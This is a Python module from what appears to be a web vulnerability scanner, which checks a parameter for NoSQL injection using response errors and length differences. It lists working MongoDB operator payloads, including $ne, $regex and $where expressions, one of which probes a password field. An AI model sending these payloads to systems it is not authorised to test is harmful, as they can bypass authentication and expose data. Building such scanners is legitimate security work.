#!/usr/bin/env python3
"""
NoSQL Injection Verifier
========================
Targets MongoDB, CouchDB, Redis.

  Stage 1: JSON payload injection
  Stage 2: Error-based detection
  Stage 3: Response differential
"""
import re

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class NoSQLVerifier(BaseVerifier):
    VULN_TYPE = "NoSQLi"
    VULN_TITLE = "NoSQL Injection"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-943"
    DEFAULT_CVSS = 8.0
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
    DEFAULT_REMEDIATION = (
        "Validate and cast input to expected types. Never pass raw user "
        "input to NoSQL query objects. Use schema validation libraries. "
        "Escape special characters ($ and .) in keys."
    )

    JSON_PAYLOADS = [
        ('{"$ne": null}', "Not-equal null"),
        ('{"$ne": ""}', "Not-equal empty"),
        ('{"$gt": ""}', "Greater-than empty"),
        ('{"$regex": ".*"}', "Regex match-all"),
        ('{"$exists": true}', "Exists"),
        ('{"$where": "1==1"}', "Where true"),
        ('{"$where": "1==2"}', "Where false"),
        ('{"$where": "this.password.match(/.*/)"}', "Password regex"),
    ]

    ERROR_PATTERNS = [
        (r"MongoError", "MongoDB error"),
        (r"Uncaught MongoDB", "MongoDB exception"),
        (r"mongoengine", "MongoEngine error"),
        (r"CastError", "Mongoose CastError"),
        (r"BSONTypeError", "BSON type error"),
        (r"Redis.*error", "Redis error"),
    ]

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        all_evidence = []
        confidence = 0.0
        key_exchange = None

        step = self.start_step(
            "json_injection",
            "Testing NoSQL injection via JSON payloads",
            stage="detection",
        )

        # Baseline
        baseline = self.inject(url, param, "1", method, form_data)
        baseline_len = len(baseline.response_body or "") if baseline else 0

        for payload, desc in self.JSON_PAYLOADS:
            ex = self.inject(url, param, payload, method, form_data)
            if not ex or ex.response_status == 0:
                continue

            # Error-based
            for pattern, err_desc in self.ERROR_PATTERNS:
                m = re.search(pattern, ex.response_body or "", re.I)
                if m:
                    ev = VerificationEvidence(
                        type="nosql_error",
                        title=f"NoSQL error: {err_desc}",
                        description="Application returned NoSQL error",
                        payload=payload,
                        raw_match=m.group(0)[:200],
                        exchange=ex,
                        confidence=0.9,
                    )
                    all_evidence.append(ev)
                    self.finish_step(step, "passed", payload=payload,
                                    details=err_desc, evidence=[ev])
                    confidence = 0.9
                    key_exchange = ex
                    break

            # Response differential
            if confidence == 0 and baseline_len > 0:
                new_len = len(ex.response_body or "")
                if abs(new_len - baseline_len) > baseline_len * 0.3:
                    if (ex.response_status == 200 and
                        "error" not in (ex.response_body or "").lower()[:500]):
                        ev = VerificationEvidence(
                            type="nosql_response_change",
                            title=f"NoSQL response differential ({desc})",
                            description=(
                                f"Response changed from {baseline_len} to "
                                f"{new_len} bytes"
                            ),
                            payload=payload,
                            extracted_data={
                                "baseline_len": baseline_len,
                                "new_len": new_len,
                            },
                            exchange=ex,
                            confidence=0.7,
                        )
                        all_evidence.append(ev)
                        self.finish_step(
                            step, "passed", payload=payload,
                            details=desc,
                            evidence=[ev],
                        )
                        confidence = 0.7
                        key_exchange = ex
                        break

        if confidence == 0:
            self.finish_step(step, "failed",
                            details="No NoSQL injection detected")

        if confidence >= 0.7:
            methods = [s.name for s in self.steps if s.status == "passed"]
            return self.build_finding(
                url=url, param=param,
                confidence=confidence,
                description="NoSQL injection confirmed",
                methods=methods,
                key_exchange=key_exchange,
            )
        return None